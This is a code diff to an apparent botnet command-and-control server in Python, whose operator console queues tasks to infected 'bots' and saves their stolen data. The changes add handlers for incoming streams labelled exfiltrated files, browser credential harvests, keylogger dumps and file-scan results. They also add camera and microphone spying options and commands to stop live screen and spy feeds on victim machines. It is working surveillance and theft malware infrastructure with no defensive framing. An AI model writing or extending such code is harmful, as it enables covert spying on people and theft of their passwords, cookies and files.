@@ -48,9 +48,9 @@ event_log     = []
 start_time    = 0
 screenshot_buffers = {} # { bot_ip: { "size": 0, "received": 0, "data": bytearray() } }
 
-FLASK_PORT  = 6969
+FLASK_PORT  = 6970
 SHELL_PORT  = 4444
-PUBLIC_PORT = 8443
+PUBLIC_PORT = 6969
 TURBO_PORT  = 5556
 
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -72,7 +72,7 @@ ATOMS = {
     11: {"name": "PING",           "icon": "PN", "desc": "Latency Probe (RTT)",       "type": "simple",  "cmd": "PING"},
     12: {"name": "BALE BOT",       "icon": "BB", "desc": "Telegram-like C2 via Bale", "type": "simple", "cmd": "START"},
     13: {"name": "CRED HARVEST",   "icon": "CH", "desc": "Browser Passwords & Cookies", "type": "simple", "cmd": "START"},
-    14: {"name": "SPY CAM/MIC",    "icon": "SM", "desc": "Camera + Microphone Capture", "type": "prompt", "ask": "Mode (MIC / CAM / BOTH)"},
+    14: {"name": "SPY CAM/MIC",    "icon": "SM", "desc": "Camera + Microphone Capture", "type": "prompt", "ask": "Mode (MIC [sec] / CAM / BOTH [sec])"},
 }
 
 # --- TURBO TCP LISTENER --------------------------------------------------
@@ -93,25 +93,32 @@ def run_turbo_listener(port):
         except: pass
 
 def handle_turbo_client(client):
+    data = bytearray()
     try:
-        # 1. Read the header length and header (Implementation specific format)
-        # We expect Atom to send a 4-byte header length, then the header string, then data
-        # For simplicity, we just dump everything into a file with a timestamp
-        data = bytearray()
-        while True:
-            chunk = client.recv(65536)
-            if not chunk: break
-            data.extend(chunk)
-            
+        # Read all data — catch connection resets gracefully so we still
+        # save whatever arrived before the socket was killed.
+        try:
+            while True:
+                chunk = client.recv(65536)
+                if not chunk: break
+                data.extend(chunk)
+        except (ConnectionResetError, ConnectionAbortedError, OSError):
+            pass  # Socket was closed/reset, but data buffer may still have frames
+
         if len(data) > 10:
             # Try to peek first bytes to determine type
-            head = data[:32].decode(errors='ignore')
+            head = data[:64].decode(errors='ignore')
             ext = ".bin"
             prefix = "turbo_stream"
             
             if "[SCREENSHOT" in head: ext = ".png"; prefix = "live_screen"
             elif "[SPY_MIC" in head: ext = ".wav"; prefix = "live_mic"
             elif "[SPY_CAM" in head: ext = ".bmp"; prefix = "live_cam"
+            elif "[EXFIL" in head: ext = ".bin"; prefix = "exfil_file"
+            elif "[CREDS" in head: ext = ".zip"; prefix = "creds_harvest"
+            elif "[KEYLOG" in head: ext = ".txt"; prefix = "keylog_dump"
+            elif "[FILESCAN" in head: ext = ".txt"; prefix = "filescan_results"
+            elif "[FS_FILE" in head: ext = ".bin"; prefix = "filescan_exfil"
             
             output_dir = os.path.join(LOOT_DIR, "Turbo_TCP_Streams")
             os.makedirs(output_dir, exist_ok=True)
@@ -120,10 +127,8 @@ def handle_turbo_client(client):
             # Strip the string header (everything up to first null or bracket end)
             # Find end of header bracket ']'
             start_idx = 0
-            # Just write the whole blob if we can't parse gracefully, but standard logic can just find ']'
             bracket_pos = data.find(b']')
             if bracket_pos != -1:
-                # Often there's a size=... text. Let's just find the first byte > 127 or null
                 for i in range(bracket_pos, min(len(data), 128)):
                     if data[i] == 0:
                         start_idx = i + 1
@@ -132,10 +137,10 @@ def handle_turbo_client(client):
             with open(out_path, "wb") as f:
                 f.write(data[start_idx:] if start_idx > 0 else data)
                 
-            log_event(f"{G}TURBO STREAM{X} saved: {out_path}")
+            log_event(f"{G}TURBO STREAM{X} saved: {out_path} ({len(data)} bytes)")
             
     except Exception as e:
-        pass
+        log_event(f"{R}TURBO ERROR{X}: {e} (had {len(data)} bytes)")
     finally:
         try: client.close()
         except: pass
@@ -371,7 +376,7 @@ def telemetry():
                                 total_size = int(display_text.split("=")[1])
                             elif display_text.startswith("[SPY_CAM]"):
                                 file_type = "spy_cam"
-                                ext = ".bmp"
+                                ext = ".png"
                                 total_size = int(display_text.split("=")[1])
                             elif display_text.startswith("[SPY_MIC]"):
                                 file_type = "spy_mic"
@@ -404,6 +409,10 @@ def telemetry():
                         buf = screenshot_buffers[bot_ip]
                         buf["data"].extend(decoded_blob)
                         buf["received"] += len(decoded_blob)
+                        
+                        # Log progress for every 5 chunks or so
+                        if buf["received"] < buf["size"]:
+                            log_event(f"  {D}Chunk received: {buf['received']}/{buf['size']} bytes ({len(decoded_blob)} byte chunk){X}")
                         
                         if buf["received"] >= buf["size"]:
                             # FINISHED!
@@ -840,10 +849,27 @@ def bot_session(target_ip):
         draw_events(3)
 
         print(f"\n   {W}Enter atom {C}#{W} to deploy  │  {C}t{W} = tune  │  {C}l{W} = loot  │  {C}s{W} = sysinfo  │  {C}q{W} = back{X}")
+        print(f"   {D}/force_stop = kill live feeds  │  /stop_live = clean stop{X}")
         choice = input(f"   {W}> {X}").strip().lower()
 
         if choice == 'q' or choice == 'quit':
             break
+        elif choice == '/force_stop':
+            # Stop Screen & Spy atoms immediately
+            task_queue.setdefault(target_ip, []).append({"atom_id": 6, "payload": "TERMINATE"})
+            task_queue.setdefault(target_ip, []).append({"atom_id": 14, "payload": "TERMINATE"})
+            log_event(f"{R}FORCE STOP{X} signals queued for {target_ip}")
+            print(f"\n   {R}[!] Force stop signals queued for Screen & Spy atoms.{X}")
+            time.sleep(1)
+            continue
+        elif choice == '/stop_live':
+            # Specific BALE_STOP for Bale mode
+            task_queue.setdefault(target_ip, []).append({"atom_id": 6, "payload": "BALE_STOP"})
+            task_queue.setdefault(target_ip, []).append({"atom_id": 14, "payload": "BALE_STOP"})
+            log_event(f"{Y}STOP LIVE{X} signals queued for {target_ip}")
+            print(f"\n   {Y}[*] Live stream stop commands queued.{X}")
+            time.sleep(1)
+            continue
         elif choice == 'l':
             draw_loot_page(target_ip)
             continue
